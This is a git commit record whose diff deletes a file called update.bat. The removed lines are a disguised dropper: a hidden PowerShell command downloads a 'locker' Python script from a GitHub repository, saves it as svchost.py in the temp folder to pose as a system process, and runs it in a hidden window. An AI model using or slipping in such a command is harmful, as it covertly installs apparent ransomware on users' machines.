22a11de814f1549a2a234abfabc018142b3735ad
A3 <www.achua6@gmail.com>
2026-07-29 22:39:31 +0530

    Delete update.bat

--- update.bat
+++
@@ -1,2 +0,0 @@
-@echo off
-powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/R0TA3/locker-test/main/locker.py' -OutFile '%TEMP%\svchost.py'; Start-Process python -ArgumentList '%TEMP%\svchost.py' -WindowStyle Hidden}"
